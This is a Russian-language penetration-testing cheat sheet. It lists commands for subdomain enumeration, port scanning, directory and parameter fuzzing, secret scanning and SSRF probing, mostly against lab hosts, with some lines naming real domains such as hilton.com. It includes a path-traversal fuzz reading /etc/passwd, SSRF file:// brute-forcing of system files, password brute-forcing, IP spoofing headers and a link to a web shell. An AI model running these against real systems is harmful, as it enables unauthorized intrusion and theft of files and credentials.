# Разведка поддоменов из свободных ресурсов
	
 ФОТОН
    https://spy-soft.net/photon-web-crawler-osint/

    - через DNS
    
    subfinder -d hilton.com
    
    sublist3r -d hilton.com

    assetfinder -subs-only example.com >> assetfinder_example.com 
    
 	--- Поиск доменов по ip
    https://dnsdumpster.com/

	amass enum -passive -d example.com (пассивный режим)

	amass enum -d example.com (активный режим)

# Разведка поддоменов перебором

	gobuster dns -w word.txt -d hilton.com -i (брут по днс)

# Сортировка повторов

	sort dns_names.txt | uniq

# Поиск живых поддоменов

 	httpx -status-code -tech-detect -list all_subdomains_example.com

# Поиск ссылок из адреса или домена

	xurlfind3r -d av.ru -o results

# Брут директрий и доменов

	gobuster dns -w word.txt -d hilton.com -i (брут по днс)

# Пасивный поиск портов на хосте

	https://search.censys.io/
 
# Активный поиск - конечно же nmap

 	nmap -sCV example.com
	nmap -sS -T4 -sV example.com
 
# Основной словарик каталогов

https://github.com/mxdelta/SecLists/blob/master/Discovery/Web-Content/big.txt

утилиты

wpscan --url://192.168.50.200/wordpress/ --wp-content-dir -at -eu  (все директории и все плагины для вордпресс)

gobuster dir -u http://192.168.50.13 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -k -x txt,html,php,css,js,sh,py,cgi,db -t 50

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u https://watch.streamio.htb/ -x php

gobuster dir -u 10.129.249.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 10 -x php,html,bak,txt

gobuster vhost --append-domain -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u http://thetoppers.htb 

ffuf -u http://10.10.11.187 -H "Host: FUZZ.flight.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fs 7069


---- Брут с автоматической рекурсией

	feroxbuster -u http://internal.analysis.htb -w /opt/SecList/Discovery/Web-Content/raft-small-words-lovercase.txt -x php -o output.txt

	Жмем Enter и пишем ----> c -f 3-5,8,9  (это исключит рекрсивный поиск в этих каталогах)

 
# фазинг переменных в GET запросе

wfuzz -c -u 'http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=test' -w /usr/share/wfuzz/wordlist/general/big.txt

ffuf -c -r -u 'http://192.168.50.205/secret/evil.php?FUZZ=../../../../etc/passwd' -w /usr/share/SecLists/Discovery/Web-Content/common.txt -fs 0

ffuf -c -u 'http://internal.analysis.htb/users/list.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fw 2 (-fs 17 ----фильтр длинный ответа)

ffuf  -u 'http://10.10.11.173/reports.php?report=FUZZ' -w numbers.txt -fs 0 -mr 'Disclosure Information'

( -mr - искать совпадения)

# Фазинг переменных в POST запросе

ffuf -request req.txt -request-proto http -w /usr/share/wordlists/SecLists/Fuzzing/special-chars.txt -fs 724,727

где req.txt - захваченный POST запрос из BURPA

wfuzz -u http://11.11.11.11/centrion/api/index.php?action=autenticate -d ‘username=admin&password=FUZZ’ -w /wordlist -hc 403


# сканирование на веб дырки

nikto -url http://10.10.217.189/

# Веб-скрейпинг
	Поиск скриптов JScript на страницах
	
 	go install github.com/003random/getJS/v2@latest
	# добавление в PATH, если раньше не добавлял
	echo "export PATH=\"$HOME/go/bin:\$PATH\"" >> ~/.zshrc
	source ~/.zshrc
 
	getJS --url <URL>

# TruffleHog — автоматизируем поиск в коде
	sudo apt install trufflehog 

 	TruffleHog filesystem <название директории>

  	trufflehog git <ссылка на репозиторий> --only-verified
   

# Web Shell

https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx

# словарик для бурпа - к примеру заголовки

	https://github.com/PortSwigger/param-miner/tree/master

 # Смена IP при запрсе 

 	X-Forwarded-For: 1

# Брут файловой системы чере ssrf

	ffuf -u http://10.124.1.237/convert.php?url=file://FUZZ -w ~/wordlists/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt  -e .php,.html,.txt,.zip,.gz,.tar,.dat,.log,.tar.gz,.sql,.rar,.swp,.bak,.asp,.aspx,.js,.img,.png,.jpeg -fs 1018
